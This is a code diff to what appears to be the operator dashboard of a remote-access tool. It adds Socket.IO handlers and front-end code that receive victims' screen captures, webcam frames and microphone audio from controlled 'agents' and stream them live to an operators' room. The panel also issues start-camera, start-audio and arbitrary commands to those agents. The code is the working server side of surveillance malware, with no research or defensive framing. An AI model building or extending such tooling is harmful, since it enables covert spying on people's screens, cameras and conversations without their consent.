@@ -1192,16 +1192,12 @@ DASHBOARD_HTML = r'''
             </div>
         </div>
 
-        <!-- Hidden audio player for streams -->
-        <audio id="audio-player" controls style="display:none; width: 100%; margin-top: 10px;"></audio>
+
     </div>
 
     <script>
         const socket = io();
         let selectedAgentId = null;
-        let videoWindow = null;
-        let cameraWindow = null;
-        let audioPlayer = null;
 
         // --- Agent Management ---
         function selectAgent(element, agentId) {
@@ -1286,15 +1282,10 @@ DASHBOARD_HTML = r'''
             }
             
             issueCommandInternal(selectedAgentId, 'start-stream');
-            issueCommandInternal(selectedAgentId, 'start-audio');
-
-            if (videoWindow && !videoWindow.closed) videoWindow.close();
-            videoWindow = window.open(`/video_feed/${selectedAgentId}`, `LiveStream_${selectedAgentId}`, 'width=800,height=600');
-
-            audioPlayer = document.getElementById('audio-player');
-            audioPlayer.src = `/audio_feed/${selectedAgentId}`;
-            audioPlayer.style.display = 'block';
-            audioPlayer.play();
+            
+            // Clear existing video display
+            const outputDisplay = document.getElementById('output-display');
+            outputDisplay.innerHTML = '<div id="video-display" style="width:100%; height:400px; background:#000; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#0f0; font-family:monospace;">Waiting for video stream...</div>';
             
             showStatus('Screen stream started', 'success');
         }
@@ -1306,9 +1297,32 @@ DASHBOARD_HTML = r'''
             }
 
             issueCommandInternal(selectedAgentId, 'start-camera');
-            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
-            cameraWindow = window.open(`/camera_feed/${selectedAgentId}`, `CameraStream_${selectedAgentId}`, 'width=640,height=480');
+            
+            // Clear existing camera display
+            const outputDisplay = document.getElementById('output-display');
+            outputDisplay.innerHTML = '<div id="camera-display" style="width:100%; height:400px; background:#000; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#0f0; font-family:monospace;">Waiting for camera stream...</div>';
+            
             showStatus('Camera stream started', 'success');
+        }
+
+        function updateVideoFrame(frameData) {
+            const videoDisplay = document.getElementById('video-display');
+            if (videoDisplay) {
+                videoDisplay.innerHTML = `<img src="data:image/jpeg;base64,${frameData}" style="max-width:100%; max-height:100%; object-fit:contain;" />`;
+            }
+        }
+
+        function updateCameraFrame(frameData) {
+            const cameraDisplay = document.getElementById('camera-display');
+            if (cameraDisplay) {
+                cameraDisplay.innerHTML = `<img src="data:image/jpeg;base64,${frameData}" style="max-width:100%; max-height:100%; object-fit:contain;" />`;
+            }
+        }
+
+        function updateAudioFrame(audioData) {
+            // For now, just log that audio is being received
+            // In a full implementation, we'd need to handle audio playback differently
+            console.log('Audio frame received');
         }
 
         function stopAllStreams() {
@@ -1317,13 +1331,10 @@ DASHBOARD_HTML = r'''
                 issueCommandInternal(selectedAgentId, 'stop-audio');
                 issueCommandInternal(selectedAgentId, 'stop-camera');
             }
-            if (audioPlayer) {
-                audioPlayer.pause();
-                audioPlayer.src = '';
-                audioPlayer.style.display = 'none';
-            }
-            if (videoWindow && !videoWindow.closed) videoWindow.close();
-            if (cameraWindow && !cameraWindow.closed) cameraWindow.close();
+            
+            // Clear video and camera displays
+            const outputDisplay = document.getElementById('output-display');
+            outputDisplay.textContent = 'System ready. Awaiting commands...';
             
             showStatus('All streams stopped', 'success');
         }
@@ -1366,6 +1377,25 @@ DASHBOARD_HTML = r'''
 
         socket.on('status_update', (data) => {
             showStatus(data.message, data.type);
+        });
+
+        // Handle real-time streaming frames via Socket.IO
+        socket.on('screen_frame_update', (data) => {
+            if (data.agent_id === selectedAgentId) {
+                updateVideoFrame(data.frame);
+            }
+        });
+
+        socket.on('camera_frame_update', (data) => {
+            if (data.agent_id === selectedAgentId) {
+                updateCameraFrame(data.frame);
+            }
+        });
+
+        socket.on('audio_frame_update', (data) => {
+            if (data.agent_id === selectedAgentId) {
+                updateAudioFrame(data.audio);
+            }
         });
 
         // Add key listener to command input
@@ -1723,6 +1753,77 @@ def index():
 @require_auth
 def dashboard():
     return DASHBOARD_HTML
+
+# --- Real-time Streaming Socket.IO Handlers ---
+
+@socketio.on('screen_frame')
+def handle_screen_frame(data):
+    """Handle screen frame from agent via Socket.IO."""
+    agent_id = data.get('agent_id')
+    frame_data = data.get('frame')
+    timestamp = data.get('timestamp')
+    
+    if agent_id and frame_data:
+        try:
+            # Decode base64 frame data
+            frame_bytes = base64.b64decode(frame_data)
+            VIDEO_FRAMES[agent_id] = frame_bytes
+            
+            # Forward to operators
+            emit('screen_frame_update', {
+                'agent_id': agent_id,
+                'frame': frame_data,
+                'timestamp': timestamp
+            }, room='operators', broadcast=True)
+            
+        except Exception as e:
+            print(f"Error handling screen frame: {e}")
+
+@socketio.on('camera_frame')
+def handle_camera_frame(data):
+    """Handle camera frame from agent via Socket.IO."""
+    agent_id = data.get('agent_id')
+    frame_data = data.get('frame')
+    timestamp = data.get('timestamp')
+    
+    if agent_id and frame_data:
+        try:
+            # Decode base64 frame data
+            frame_bytes = base64.b64decode(frame_data)
+            CAMERA_FRAMES[agent_id] = frame_bytes
+            
+            # Forward to operators
+            emit('camera_frame_update', {
+                'agent_id': agent_id,
+                'frame': frame_data,
+                'timestamp': timestamp
+            }, room='operators', broadcast=True)
+            
+        except Exception as e:
+            print(f"Error handling camera frame: {e}")
+
+@socketio.on('audio_frame')
+def handle_audio_frame(data):
+    """Handle audio frame from agent via Socket.IO."""
+    agent_id = data.get('agent_id')
+    audio_data = data.get('audio')
+    timestamp = data.get('timestamp')
+    
+    if agent_id and audio_data:
+        try:
+            # Decode base64 audio data
+            audio_bytes = base64.b64decode(audio_data)
+            AUDIO_CHUNKS[agent_id].put(audio_bytes)
+            
+            # Forward to operators
+            emit('audio_frame_update', {
+                'agent_id': agent_id,
+                'audio': audio_data,
+                'timestamp': timestamp
+            }, room='operators', broadcast=True)
+            
+        except Exception as e:
+            print(f"Error handling audio frame: {e}")
 
 # --- Real-time Streaming Endpoints (unchanged) ---
 
